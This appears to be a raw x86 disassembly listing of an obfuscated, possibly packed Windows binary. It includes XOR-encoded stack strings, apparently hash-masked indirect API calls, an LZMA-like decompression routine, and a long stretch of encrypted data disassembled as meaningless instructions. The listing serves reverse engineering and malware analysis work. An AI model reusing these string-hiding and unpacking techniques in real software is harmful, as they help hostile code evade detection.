  423fdd:	push   0x8
  423fdf:	mov    WORD PTR [ebp-0x7c],ax
  423fe3:	mov    DWORD PTR [ebp-0x10],0x316120f
  423fea:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  423ff1:	lea    eax,[ebp-0x10]
  423ff4:	pop    ecx
  423ff5:	mov    dl,BYTE PTR [eax]
  423ff7:	xor    dl,0x79
  423ffa:	sub    dl,0x3
  423ffd:	mov    BYTE PTR [eax],dl
  423fff:	inc    eax
  424000:	dec    ecx
  424001:	jne    0x423ff5
  424003:	lea    eax,[ebp-0x10]
  424006:	mov    DWORD PTR [ebp-0xdc],eax
  42400c:	lea    eax,[ebp-0xe0]
  424012:	push   eax
  424013:	mov    eax,DWORD PTR [ebp+0xc]
  424016:	xor    eax,edi
  424018:	add    eax,ebx
  42401a:	push   eax
  42401b:	mov    eax,DWORD PTR [ebp-0x4]
  42401e:	add    eax,0x66
  424021:	push   eax
  424022:	mov    eax,DWORD PTR [ebp-0x4]
  424025:	mov    eax,DWORD PTR [eax+0x198]
  42402b:	mov    DWORD PTR [ebp-0xe0],0x1
  424035:	push   DWORD PTR [eax]
  424037:	mov    eax,DWORD PTR [ebp+0x10]
  42403a:	call   eax
  42403c:	mov    ecx,DWORD PTR [ebp+0x8]
  42403f:	xor    ecx,edi
  424041:	add    ecx,ebx
  424043:	mov    DWORD PTR [ebp-0x8],eax
  424046:	cmp    eax,ecx
  424048:	jne    0x424063
  42404a:	mov    eax,ds:0x33730bcf
  42404f:	or     eax,0x22150bce
  424054:	mov    ds:0x33730bcf,eax
  424059:	add    eax,0x3372e92e
  42405e:	mov    ds:0x33730bcf,eax
  424063:	mov    ecx,0x4f96
  424068:	mov    eax,ecx
  42406a:	mov    WORD PTR [ebp-0x40],ax
  42406e:	mov    eax,0x4e63
  424073:	mov    edx,eax
  424075:	mov    WORD PTR [ebp-0x3e],dx
  424079:	lea    edx,[ecx+0x5]
  42407c:	mov    WORD PTR [ebp-0x3c],dx
  424080:	add    edx,0xffffffe8
  424083:	mov    WORD PTR [ebp-0x3a],dx
  424087:	lea    edx,[ecx-0x9]
  42408a:	mov    WORD PTR [ebp-0x38],dx
  42408e:	add    edx,0xfffffffb
  424091:	mov    WORD PTR [ebp-0x36],dx
  424095:	lea    edx,[ecx+0x21]
  424098:	mov    WORD PTR [ebp-0x34],dx
  42409c:	mov    WORD PTR [ebp-0x32],cx
  4240a0:	mov    ecx,esi
  4240a2:	mov    WORD PTR [ebp-0x30],cx
  4240a6:	lea    ecx,[edx-0x1]
  4240a9:	mov    edx,ecx
  4240ab:	mov    WORD PTR [ebp-0x54],dx
  4240af:	mov    edx,eax
  4240b1:	mov    WORD PTR [ebp-0x52],dx
  4240b5:	add    edx,0x18
  4240b8:	mov    WORD PTR [ebp-0x50],dx
  4240bc:	mov    WORD PTR [ebp-0x4e],ax
  4240c0:	add    eax,0xa
  4240c3:	mov    WORD PTR [ebp-0x4c],ax
  4240c7:	mov    eax,0x4e68
  4240cc:	mov    WORD PTR [ebp-0x4a],ax
  4240d0:	lea    eax,[ecx-0x1f]
  4240d3:	mov    WORD PTR [ebp-0x48],ax
  4240d7:	mov    WORD PTR [ebp-0x46],cx
  4240db:	mov    WORD PTR [ebp-0x44],si
  4240df:	mov    eax,DWORD PTR [ebp+0x8]
  4240e2:	movzx  ecx,WORD PTR [ebp-0x54]
  4240e6:	xor    eax,edi
  4240e8:	add    eax,ebx
  4240ea:	xor    eax,ecx
  4240ec:	mov    WORD PTR [ebp-0x54],ax
  4240f0:	mov    eax,DWORD PTR [ebp+0x8]
  4240f3:	movzx  ecx,WORD PTR [ebp-0x40]
  4240f7:	xor    eax,edi
  4240f9:	add    eax,ebx
  4240fb:	xor    eax,ecx
  4240fd:	mov    WORD PTR [ebp-0x40],ax
  424101:	xor    eax,eax
  424103:	mov    WORD PTR [ebp-0xf4],ax
  42410a:	mov    WORD PTR [ebp-0x108],ax
  424111:	mov    edi,DWORD PTR [ebp+0x24]
  424114:	lea    eax,[ebp-0xf4]
  42411a:	lea    edx,[ebp-0x54]
  42411d:	mov    DWORD PTR [ebp-0xe0],0x2
  424127:	mov    DWORD PTR [ebp-0xdc],eax
  42412d:	call   0x426b43
  424132:	mov    DWORD PTR [ebp-0xd8],eax
  424138:	lea    eax,[ebp-0xe0]
  42413e:	push   eax
  42413f:	mov    eax,DWORD PTR [ebp+0xc]
  424142:	xor    eax,0x75108a4
  424147:	add    eax,ebx
  424149:	push   eax
  42414a:	lea    eax,[ebp-0x9c]
  424150:	push   eax
  424151:	push   DWORD PTR [ebp-0x8]
  424154:	mov    eax,DWORD PTR [ebp+0x10]
  424157:	call   eax
  424159:	mov    edi,DWORD PTR [ebp+0x24]
  42415c:	lea    eax,[ebp-0x108]
  424162:	lea    edx,[ebp-0x40]
  424165:	mov    DWORD PTR [ebp-0xdc],eax
  42416b:	call   0x426b43
  424170:	mov    DWORD PTR [ebp-0xd8],eax
  424176:	mov    edi,0x75108a4
  42417b:	mov    eax,DWORD PTR [ebp+0x14]
  42417e:	push   DWORD PTR [ebp-0x4]
  424181:	push   DWORD PTR [ebp+0x20]
  424184:	push   DWORD PTR [ebp+0x1c]
  424187:	push   DWORD PTR [ebp+0x18]
  42418a:	push   DWORD PTR [ebp+0x10]
  42418d:	push   DWORD PTR [ebp+0x8]
  424190:	push   DWORD PTR [ebp+0xc]
  424193:	call   0x4253e0
  424198:	test   eax,eax
  42419a:	je     0x4241de
  42419c:	add    DWORD PTR [ebp-0x4],eax
  42419f:	push   DWORD PTR [ebp-0x4]
  4241a2:	lea    esi,[ebp+0x4]
  4241a5:	call   0x4245ce
  4241aa:	mov    eax,DWORD PTR [ebp-0x4]
  4241ad:	mov    eax,DWORD PTR [eax+0x1c8]
  4241b3:	mov    eax,DWORD PTR [eax]
  4241b5:	xor    eax,edi
  4241b7:	add    eax,ebx
  4241b9:	mov    eax,DWORD PTR [ebp-0x4]
  4241bc:	jne    0x4241d4
  4241be:	mov    ecx,DWORD PTR [ebp-0x4]
  4241c1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4241c7:	push   DWORD PTR [ecx]
  4241c9:	mov    eax,DWORD PTR [eax+0x1d8]
  4241cf:	call   DWORD PTR [eax+0x28]
  4241d2:	jmp    0x4241de
  4241d4:	mov    eax,DWORD PTR [eax+0x17c]
  4241da:	mov    eax,DWORD PTR [eax]
  4241dc:	add    DWORD PTR [esi],eax
  4241de:	pop    edi
  4241df:	pop    esi
  4241e0:	pop    ebx
  4241e1:	leave  
  4241e2:	ret    0x20
  4241e5:	push   edi
  4241e6:	push   esi
  4241e7:	push   ebx
  4241e8:	push   ebp
  4241e9:	mov    ebp,esp
  4241eb:	mov    eax,DWORD PTR [ebp+0x24]
  4241ee:	add    DWORD PTR [ebp+0x28],eax
  4241f1:	push   eax
  4241f2:	cld    
  4241f3:	mov    esi,DWORD PTR [ebp+0x18]
  4241f6:	add    DWORD PTR [ebp+0x1c],esi
  4241f9:	push   esi
  4241fa:	mov    esi,DWORD PTR [ebp+0x14]
  4241fd:	lods   eax,DWORD PTR ds:[esi]
  4241fe:	xchg   edx,eax
  4241ff:	push   edx
  424200:	mov    cl,BYTE PTR [esi-0x2]
  424203:	or     eax,0xffffffff
  424206:	shl    eax,cl
  424208:	not    eax
  42420a:	push   eax
  42420b:	mov    cl,dh
  42420d:	or     eax,0xffffffff
  424210:	shl    eax,cl
  424212:	not    eax
  424214:	push   eax
  424215:	add    cl,dl
  424217:	mov    edi,esi
  424219:	sub    esp,0xc
  42421c:	sub    eax,eax
  42421e:	inc    eax
  42421f:	push   eax
  424220:	push   eax
  424221:	push   eax
  424222:	push   eax
  424223:	push   eax
  424224:	push   edi
  424225:	sub    esi,esi
  424227:	push   esi
  424228:	or     ebx,0xffffffff
  42422b:	mov    eax,0x300
  424230:	shl    eax,cl
  424232:	lea    ecx,[eax+0x736]
  424238:	mov    eax,0x4000400
  42423d:	shr    ecx,1
  42423f:	rep stos DWORD PTR es:[edi],eax
  424241:	push   0x5
  424243:	pop    ecx
  424244:	call   0x42452f
  424249:	loop   0x424244
  42424b:	lea    esi,[esi]
  42424d:	lea    edi,[edi]
  42424f:	mov    edi,DWORD PTR [ebp-0x4]
  424252:	mov    eax,DWORD PTR [ebp-0x10]
  424255:	sub    edi,DWORD PTR [ebp+0x24]
  424258:	and    eax,edi
  42425a:	mov    DWORD PTR [ebp-0x18],eax
  42425d:	mov    al,0x0
  42425f:	call   0x424547
  424264:	jne    0x4242ff
  42426a:	mov    cl,BYTE PTR [ebp-0xc]
  42426d:	and    edi,DWORD PTR [ebp-0x14]
  424270:	shl    edi,cl
  424272:	sub    cl,0x8
  424275:	neg    cl
  424277:	shr    esi,cl
  424279:	pop    eax
  42427a:	add    edi,esi
  42427c:	pop    esi
  42427d:	lea    edi,[edi+edi*2]
  424280:	shl    edi,0x8
  424283:	cmp    al,0x7
  424285:	pop    edx
  424286:	lea    ecx,[esi+edi*2+0xe6c]
  42428d:	push   ecx
  42428e:	push   esi
  42428f:	mov    esi,0x100
  424294:	push   eax
  424295:	mov    al,0x1
  424297:	jb     0x4242cd
  424299:	mov    edi,DWORD PTR [ebp-0x4]
  42429c:	sub    edi,DWORD PTR [ebp-0x24]
  42429f:	movzx  edi,BYTE PTR [edi]
  4242a2:	mov    ebp,DWORD PTR [ebp-0x34]
  4242a5:	shl    edi,1
  4242a7:	mov    ecx,esi
  4242a9:	and    esi,edi
  4242ab:	add    ecx,esi
  4242ad:	lea    ebp,[ebp+ecx*2+0x0]
  4242b1:	call   0x424566
  4242b6:	mov    ecx,eax
  4242b8:	shr    esi,0x8
  4242bb:	and    ecx,0x1
  4242be:	cmp    esi,ecx
  4242c0:	mov    esi,0x100
  4242c5:	jne    0x4242d5
  4242c7:	cmp    eax,esi
  4242c9:	jb     0x4242a2
  4242cb:	jmp    0x4242e1
  4242cd:	mov    ebp,DWORD PTR [ebp-0x34]
  4242d0:	call   0x424566
  4242d5:	inc    eax
  4242d6:	inc    esi
  4242d7:	sub    eax,0x1
  4242da:	sub    esi,0x1
  4242dd:	cmp    eax,esi
  4242df:	jb     0x4242cd
  4242e1:	pop    edx
  4242e2:	inc    edx
  4242e3:	cmp    edx,0x5
  4242e6:	dec    edx
  4242e7:	mov    ecx,edx
  4242e9:	jb     0x4242fa
  4242eb:	inc    edx
  4242ec:	cmp    edx,0xb
  4242ef:	dec    edx
  4242f0:	mov    cl,0x4
  4242f2:	dec    cl
  4242f4:	jb     0x4242fa
  4242f6:	mov    cl,0x7
  4242f8:	dec    cl
  4242fa:	sub    edx,ecx
  4242fc:	push   edx
  4242fd:	jmp    0x42434e
  4242ff:	mov    al,0xc1
  424301:	dec    al
  424303:	call   0x424557
  424308:	jne    0x42431e
  42430a:	pop    eax
  42430b:	pop    edi
  42430c:	pop    edx
  42430d:	pop    ecx
  42430e:	pop    edx
  42430f:	pop    ecx
  424310:	push   DWORD PTR [esp]
  424313:	push   ecx
  424314:	push   edx
  424315:	mov    edx,0x664
  42431a:	mov    cl,0x0
  42431c:	jmp    0x424391
  42431e:	mov    al,0xcd
  424320:	dec    al
  424322:	call   0x424557
  424327:	jne    0x424357
  424329:	mov    al,0xf1
  42432b:	dec    al
  42432d:	call   0x424547
  424332:	jne    0x424387
  424334:	pop    eax
  424335:	cmp    al,0x7
  424337:	mov    al,0x9
  424339:	jb     0x42433d
  42433b:	mov    al,0xb
  42433d:	push   eax
  42433e:	mov    esi,DWORD PTR [ebp-0x4]
  424341:	sub    esi,DWORD PTR [ebp-0x24]
  424344:	cmp    esi,DWORD PTR [ebp+0x24]
  424347:	jb     0x42451e
  42434d:	lods   al,BYTE PTR ds:[esi]
  42434e:	mov    edi,DWORD PTR [ebp-0x4]
  424351:	stos   BYTE PTR es:[edi],al
  424352:	jmp    0x4244e5
  424357:	mov    al,0xd8
  424359:	call   0x424557
  42435e:	mov    esi,DWORD PTR [ebp-0x28]
  424361:	je     0x42437e
  424363:	mov    al,0xe4
  424365:	call   0x424557
  42436a:	mov    esi,DWORD PTR [ebp-0x2c]
  42436d:	je     0x424378
  42436f:	mov    esi,DWORD PTR [ebp-0x30]
  424372:	mov    ecx,DWORD PTR [ebp-0x2c]
  424375:	mov    DWORD PTR [ebp-0x30],ecx
  424378:	mov    ecx,DWORD PTR [ebp-0x28]
  42437b:	mov    DWORD PTR [ebp-0x2c],ecx
  42437e:	mov    ecx,DWORD PTR [ebp-0x24]
  424381:	mov    DWORD PTR [ebp-0x28],ecx
  424384:	mov    DWORD PTR [ebp-0x24],esi
  424387:	pop    eax
  424388:	pop    edi
  424389:	pop    ecx
  42438a:	mov    edx,0xa68
  42438f:	mov    cl,0x8
  424391:	add    edx,edi
  424393:	push   edx
  424394:	push   edi
  424395:	cmp    al,0x7
  424397:	mov    al,cl
  424399:	jb     0x42439d
  42439b:	add    al,0x3
  42439d:	push   eax
  42439e:	mov    ebp,DWORD PTR [ebp-0x34]
  4243a1:	call   0x424564
  4243a6:	jne    0x4243bc
  4243a8:	mov    eax,DWORD PTR [ebp-0x18]
  4243ab:	mov    edi,DWORD PTR [ebp-0x34]
  4243ae:	shl    eax,0x3
  4243b1:	sub    ecx,ecx
  4243b3:	push   0x8
  4243b5:	pop    esi
  4243b6:	lea    edi,[edi+eax*2+0x4]
  4243ba:	jmp    0x4243f1
  4243bc:	mov    ebp,DWORD PTR [ebp-0x34]
  4243bf:	add    ebp,0x2
  4243c2:	call   0x424564
  4243c7:	jne    0x4243e1
  4243c9:	mov    eax,DWORD PTR [ebp-0x18]
  4243cc:	mov    edi,DWORD PTR [ebp-0x34]
  4243cf:	shl    eax,0x3
  4243d2:	push   0x8
  4243d4:	pop    ecx
  4243d5:	push   0x8
  4243d7:	pop    esi
  4243d8:	lea    edi,[edi+eax*2+0x104]
  4243df:	jmp    0x4243f1
  4243e1:	mov    edi,0x204
  4243e6:	add    edi,DWORD PTR [ebp-0x34]
  4243e9:	push   0x10
  4243eb:	pop    ecx
  4243ec:	mov    esi,0x100
  4243f1:	mov    DWORD PTR [ebp-0x1c],ecx
  4243f4:	sub    eax,eax
  4243f6:	inc    eax
  4243f7:	mov    ebp,edi
  4243f9:	call   0x424566
  4243fe:	mov    ecx,eax
  424400:	sub    ecx,esi
  424402:	jb     0x4243f7
  424404:	add    DWORD PTR [ebp-0x1c],ecx
  424407:	cmp    DWORD PTR [ebp-0x3c],0x4
  42440b:	jae    0x4244c1
  424411:	add    DWORD PTR [ebp-0x3c],0x7
  424415:	mov    ecx,DWORD PTR [ebp-0x1c]
  424418:	cmp    ecx,0x4
  42441b:	jb     0x424420
  42441d:	push   0x3
  42441f:	pop    ecx
  424420:	mov    edi,DWORD PTR [ebp-0x38]
  424423:	shl    ecx,0x6
  424426:	sub    eax,eax
  424428:	inc    eax
  424429:	push   0x40
  42442b:	pop    esi
  42442c:	lea    edi,[edi+ecx*2+0x360]
  424433:	mov    ebp,edi
  424435:	call   0x424566
  42443a:	mov    ecx,eax
  42443c:	sub    ecx,esi
  42443e:	jb     0x424433
  424440:	mov    DWORD PTR [ebp-0x18],ecx
  424443:	mov    DWORD PTR [ebp-0x24],ecx
  424446:	cmp    ecx,0x4
  424449:	jb     0x4244be
  42444b:	mov    esi,ecx
  42444d:	and    DWORD PTR [ebp-0x24],0x1
  424451:	shr    esi,1
  424453:	or     DWORD PTR [ebp-0x24],0x2
  424457:	dec    esi
  424458:	cmp    ecx,0xe
  42445b:	jae    0x424476
  42445d:	mov    eax,0x2af
  424462:	sub    eax,ecx
  424464:	mov    ecx,esi
  424466:	shl    BYTE PTR [ebp-0x24],cl
  424469:	add    eax,DWORD PTR [ebp-0x24]
  42446c:	shl    eax,1
  42446e:	add    eax,DWORD PTR [ebp-0x38]
  424471:	mov    DWORD PTR [ebp-0x34],eax
  424474:	jmp    0x4244a3
  424476:	sub    esi,0x4
  424479:	call   0x424523
  42447e:	shr    ebx,1
  424480:	shl    DWORD PTR [ebp-0x24],1
  424483:	cmp    DWORD PTR [ebp-0x20],ebx
  424486:	jb     0x42448e
  424488:	inc    DWORD PTR [ebp-0x24]
  42448b:	sub    DWORD PTR [ebp-0x20],ebx
  42448e:	dec    esi
  42448f:	jne    0x424479
  424491:	mov    eax,0x644
  424496:	add    eax,DWORD PTR [ebp-0x38]
  424499:	mov    DWORD PTR [ebp-0x34],eax
  42449c:	shl    DWORD PTR [ebp-0x24],0x4
  4244a0:	push   0x4
  4244a2:	pop    esi
  4244a3:	sub    edi,edi
  4244a5:	inc    edi
  4244a6:	mov    eax,edi
  4244a8:	mov    ebp,DWORD PTR [ebp-0x34]
  4244ab:	call   0x424566
  4244b0:	test   al,0x1
  4244b2:	je     0x4244b7
  4244b4:	or     DWORD PTR [ebp-0x24],edi
  4244b7:	shl    edi,1
  4244b9:	dec    esi
  4244ba:	jne    0x4244a8
  4244bc:	jmp    0x4244be
  4244be:	inc    DWORD PTR [ebp-0x24]
  4244c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4244c4:	add    ecx,0x2
  4244c7:	mov    edi,DWORD PTR [ebp-0x4]
  4244ca:	mov    eax,edi
  4244cc:	sub    eax,DWORD PTR [ebp+0x24]
  4244cf:	cmp    DWORD PTR [ebp-0x24],eax
  4244d2:	ja     0x42451e
  4244d4:	mov    esi,edi
  4244d6:	sub    esi,DWORD PTR [ebp-0x24]
  4244d9:	mov    edx,DWORD PTR [ebp+0x28]
  4244dc:	lods   al,BYTE PTR ds:[esi]
  4244dd:	stos   BYTE PTR es:[edi],al
  4244de:	cmp    edi,edx
  4244e0:	jae    0x4244e5
  4244e2:	dec    ecx
  4244e3:	jne    0x4244dc
  4244e5:	mov    DWORD PTR [ebp-0x4],edi
  4244e8:	movzx  esi,al
  4244eb:	cmp    edi,DWORD PTR [ebp+0x28]
  4244ee:	jb     0x42424f
  4244f4:	call   0x424523
  4244f9:	sub    eax,eax
  4244fb:	lea    ebp,[esp+0x3c]
  4244ff:	mov    edx,DWORD PTR [ebp+0x20]
  424502:	mov    esi,DWORD PTR [ebp-0x8]
  424505:	sub    esi,DWORD PTR [ebp+0x18]
  424508:	mov    DWORD PTR [edx],esi
  42450a:	mov    edx,DWORD PTR [ebp+0x2c]
  42450d:	mov    edi,DWORD PTR [ebp-0x4]
  424510:	sub    edi,DWORD PTR [ebp+0x24]
  424513:	mov    DWORD PTR [edx],edi
  424515:	leave  
  424516:	pop    ebx
  424517:	pop    esi
  424518:	pop    edi
  424519:	ret    0x1c
  42451c:	pop    esi
  42451d:	pop    eax
  42451e:	sub    eax,eax
  424520:	inc    eax
  424521:	jmp    0x4244fb
  424523:	cmp    ebx,0x1000000
  424529:	jb     0x42452c
  42452b:	ret    
  42452c:	shl    ebx,0x8
  42452f:	push   esi
  424530:	mov    esi,DWORD PTR [ebp-0x8]
  424533:	cmp    esi,DWORD PTR [ebp+0x1c]
  424536:	jae    0x42451c
  424538:	mov    eax,DWORD PTR [ebp-0x20]
  42453b:	shl    eax,0x8
  42453e:	lods   al,BYTE PTR ds:[esi]
  42453f:	mov    DWORD PTR [ebp-0x20],eax
  424542:	mov    DWORD PTR [ebp-0x8],esi
  424545:	sbb    BYTE PTR [edi+0x6bbe29f7],bh
  42454b:	sar    BYTE PTR [edx+0x7f7e9dbd],0x31
  424552:	xchg   edx,eax
  424553:	jg     0x424512
  424555:	xchg   edi,eax
  424556:	jo     0x4245c3
  424558:	sar    BYTE PTR [edx-0x841ce81],0x9
  42455f:	mov    dl,0xe9
  424561:	push   ss
  424562:	xor    DWORD PTR [edx+0x57],edi
  424565:	mov    edx,0x7a3116e9
  42456a:	std    
  42456b:	xchg   DWORD PTR [edx+0x7a],edi
  42456e:	jp     0x4245ed
  424570:	pcmpgtd mm6,mm7
  424573:	ss pop esi
  424575:	inc    edx
  424576:	mov    ebp,0x725a5e1e
  42457b:	inc    edi
  42457c:	ss pop esi
  42457e:	es (bad) 
  424581:	hlt    
  424582:	ins    DWORD PTR es:[edi],dx
  424583:	jnp    0x4245c3
  424585:	pop    esi
  424586:	inc    edx
  424587:	mov    ebp,0x2ef2729f
  42458c:	pop    esi
  42458d:	pop    edx
  42458e:	div    DWORD PTR [edi+0x7a21c36b]
  424594:	mov    ebp,0xcb6b7795
  424599:	mov    ah,0x45
  42459b:	ss pop esi
  42459d:	pop    edx
  42459e:	packsswb mm6,mm7
  4245a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245a2:	lds    edi,FWORD PTR [edx+0x72]
  4245a5:	jp     0x424621
  4245a7:	push   edi
  4245a8:	mov    ah,0xbd
  4245aa:	xchg   ebp,eax
  4245ab:	jno    0x4245bd
  4245ad:	jge    0x4245d8
  4245af:	jp     0x424630
  4245b1:	mov    edx,0x3a5e16e9
  4245b6:	mov    edi,0x557194bd
  4245bb:	ss pop esi
  4245bd:	pop    edx
  4245be:	push   edi
  4245bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245c0:	adc    BYTE PTR [ebp+0x21],dl
  4245c3:	jp     0x424644
  4245c5:	mov    edx,0xe97dbaff
  4245ca:	push   ss
  4245cb:	pop    esi
  4245cc:	cmp    bh,BYTE PTR [edi-0x26908df]
  4245d2:	xchg   esi,eax
  4245d3:	push   esi
  4245d4:	jge    0x424650
  4245d6:	jp     0x424607
  4245d8:	and    BYTE PTR [ebx],ah
  4245da:	mov    bl,0x31
  4245dc:	mov    cl,dl
  4245de:	icebp  
  4245df:	out    0x82,al
  4245e1:	mov    bl,0x31
  4245e3:	xchg   edx,eax
  4245e4:	int    0xf1
  4245e6:	out    0x82,al
  4245e8:	div    DWORD PTR [ecx]
  4245ea:	jb     0x4245e1
  4245ec:	xor    DWORD PTR [edx-0x9],esi
  4245ef:	sub    DWORD PTR [edx+0x2d72dec7],ecx
  4245f5:	jae    0x424646
  4245f7:	mov    bh,0xc2
  4245f9:	xchg   esi,eax
  4245fa:	or     al,0x4c
  4245fc:	jp     0x42467d
  4245fe:	mov    dl,0xf5
  424600:	sub    DWORD PTR [esi+0x4f8a29f7],ebp
  424606:	mov    bh,0x7f
  424608:	mov    dl,0xf5
  42460a:	sub    DWORD PTR [esi+0x4f8a29f7],edi
  424610:	mov    bh,0x7f
  424612:	mov    dl,0xf5
  424614:	sub    DWORD PTR [edx+0x4f8a29f7],edi
  42461a:	mov    bh,0x7f
  42461c:	mov    dl,0xf5
  42461e:	jmp    0x7bbdc175
  424623:	mov    bl,0x31
  424625:	retf   0x71ca
  424628:	fild   DWORD PTR [edx-0x3545ce4d]
  42462e:	shl    esi,0x82
  424631:	mov    bl,0x31
  424633:	(bad)  
  424634:	(bad)  
  424635:	icebp  
  424636:	out    0x82,al
  424638:	adc    al,0x51
  42463a:	and    eax,0xf5b229f5
  42463f:	sub    DWORD PTR [edx-0xadaeeec],esi
  424645:	sub    DWORD PTR [edx-0x4c4dd60b],esi
  42464b:	xor    DWORD PTR [edx+0x7a7a7a29],esi
  424651:	mov    bl,0x31
  424653:	mov    dl,0x3f
  424655:	jp     0x4246d1
  424657:	jp     0x424650
  424659:	sub    DWORD PTR [edx-0x4d8048b1],ecx
  42465f:	cmc    
  424660:	sub    DWORD PTR [edx+0x4f8a29f7],esi
  424666:	mov    bh,0x7f
  424668:	mov    dl,0xf5
  42466a:	sub    DWORD PTR [edx+0x22a231b3],esi
  424670:	jl     0x4246ec
  424672:	jp     0x424627
  424674:	xor    DWORD PTR [edx+0x7a7a7a40],ebx
  42467a:	mov    bl,0x31
  42467c:	xchg   esi,eax
  42467d:	add    al,0x7a
  42467f:	jp     0x4246fb
  424681:	jmp    0x7bbad53f
  424686:	jnp    0x424671
  424688:	shr    DWORD PTR [esi-0x6d848488],0xb9
  42468f:	jbe    0x42470b
  424691:	jp     0x42470e
  424693:	sub    DWORD PTR [esi+0x297b9401],edx
  424699:	call   0x1a2:0x297b9801
  4246a0:	lods   al,BYTE PTR ds:[esi]
  4246a1:	mov    bl,0x31
  4246a3:	mov    ds:0x7a7a3a68,al
  4246a8:	div    DWORD PTR [ecx]
  4246aa:	mov    cl,BYTE PTR [edi-0x41]
  4246ad:	mov    eax,0x7a4c0c96
  4246b2:	jg     0x424664
  4246b4:	cmc    
  4246b5:	xor    DWORD PTR [esi-0x75ce09],ebx
  4246bb:	rcl    DWORD PTR [esi],1
  4246bd:	jnp    0x42473a
  4246bf:	jnp    0x42473b
  4246c1:	dec    edi
  4246c2:	mov    edi,0x31f5b07f
  4246c7:	mov    dh,0x1e
  4246c9:	frstor [edx+0x7a]
  4246cc:	jp     0x424748
  4246ce:	cmc    
  4246cf:	icebp  
  4246d0:	push   ss
  4246d1:	jnp    0x42474e
  4246d3:	jnp    0x4246cc
  4246d5:	cmp    cl,BYTE PTR [edx-0xb]
  4246d8:	icebp  
  4246d9:	dec    esi
  4246da:	jnp    0x424757
  4246dc:	jnp    0x4246d5
  4246de:	cmp    dh,BYTE PTR [esi-0xb]
  4246e1:	icebp  
  4246e2:	cmp    bh,BYTE PTR [ebx+0x7b]
  4246e5:	jnp    0x4246de
  4246e7:	xor    DWORD PTR [edx-0x17],esi
  4246ea:	jmp    0x7bbdc205
  4246ef:	cmc    
  4246f0:	repnz fidivr DWORD PTR [ebp+0x7a]
  4246f4:	jp     0x4246ed
  4246f6:	xor    DWORD PTR [edx-0x17],esi
  4246f9:	jmp    0x7bbdc24c
  4246fe:	cmc    
  4246ff:	repnz fidivr WORD PTR [ebp+0x7a]
  424703:	jp     0x4246fc
  424705:	xor    DWORD PTR [edx+0x7b],esi
  424708:	add    DWORD PTR [edx-0x17],esi
  42470b:	jmp    0x7bbdc24a
  424710:	cmc    
  424711:	repnz sar BYTE PTR [ebp+0x7a],cl
  424715:	jp     0x4246a9
  424717:	test   DWORD PTR [edi+0x7a],ebx
  42471a:	jp     0x424713
  42471c:	sub    DWORD PTR [edx-0x578048b1],ecx
  424722:	inc    edi
  424723:	mov    dl,0x6b
  424725:	(bad)  
  424726:	stc    
  424727:	jg     0x4247a3
  424729:	jp     0x424722
  42472b:	xor    DWORD PTR [edx-0x9],esi
  42472e:	cli    
  42472f:	out    dx,al
  424730:	jge    0x4247ac
  424732:	jp     0x42472b
  424734:	jb     0x42472d
  424736:	xor    DWORD PTR [edx-0x9],esi
  424739:	cli    
  42473a:	out    dx,al
  42473b:	jge    0x4247b7
  42473d:	jp     0x424736
  42473f:	jp     0x4247c0
  424741:	cmp    eax,0x829f746
  424746:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42474c:	lea    edx,[ebp-0xec]
  424752:	push   edx
  424753:	mov    edx,DWORD PTR [ebp+0x8]
  424756:	mov    edx,DWORD PTR [edx+0x18c]
  42475c:	mov    edx,DWORD PTR [edx]
  42475e:	add    edx,DWORD PTR [eax+0x88]
  424764:	push   0x4
  424766:	push   DWORD PTR [eax+0x8c]
  42476c:	push   edx
  42476d:	call   DWORD PTR [ecx+0x1c]
  424770:	push   DWORD PTR [ebp+0x8]
  424773:	xor    eax,eax
  424775:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  42477f:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  424789:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  424793:	mov    BYTE PTR [ebp-0x9c],0x7a
  42479a:	lea    edi,[ebp-0x9b]
  4247a0:	stos   DWORD PTR es:[edi],eax
  4247a1:	stos   WORD PTR es:[edi],ax
  4247a3:	stos   BYTE PTR es:[edi],al
  4247a4:	xor    eax,eax
  4247a6:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  4247b0:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  4247ba:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  4247c4:	mov    BYTE PTR [ebp-0xb0],0x7a
  4247cb:	lea    edi,[ebp-0xaf]
  4247d1:	stos   DWORD PTR es:[edi],eax
  4247d2:	stos   WORD PTR es:[edi],ax
  4247d4:	stos   BYTE PTR es:[edi],al
  4247d5:	mov    edi,DWORD PTR [ebp+0x8]
  4247d8:	mov    eax,DWORD PTR [ebp+0x8]
  4247db:	mov    edx,DWORD PTR [eax+0x1b8]
  4247e1:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  4247e8:	mov    DWORD PTR [ebp-0x64],0x150a091f
  4247ef:	mov    WORD PTR [ebp-0x60],0x7a3d
  4247f5:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  4247ff:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  424809:	mov    DWORD PTR [ebp-0x88],0x281d120a
  424813:	mov    DWORD PTR [ebp-0x84],0xc110901
  42481d:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  424824:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42482b:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  424832:	mov    DWORD PTR [ebp-0x74],0x281d120a
  424839:	mov    DWORD PTR [ebp-0x70],0xc110901
  424840:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  424847:	call   0x426b43
  42484c:	push   eax
  42484d:	mov    eax,DWORD PTR [ebp+0x8]
  424850:	mov    eax,DWORD PTR [eax+0x1a8]
  424856:	push   DWORD PTR [eax]
  424858:	call   0x4267e4
  42485d:	test   eax,eax
  42485f:	jne    0x4248b1
  424861:	mov    eax,DWORD PTR [ebp+0x8]
  424864:	mov    eax,DWORD PTR [eax+0x1d8]
  42486a:	mov    edi,DWORD PTR [ebp+0x8]
  42486d:	add    eax,0x4
  424870:	mov    DWORD PTR [ebp-0x24],eax
  424873:	mov    eax,DWORD PTR [ebp+0x8]
  424876:	mov    edx,DWORD PTR [eax+0x1b8]
  42487c:	call   0x426b43
  424881:	push   eax
  424882:	mov    eax,DWORD PTR [ebp-0x24]
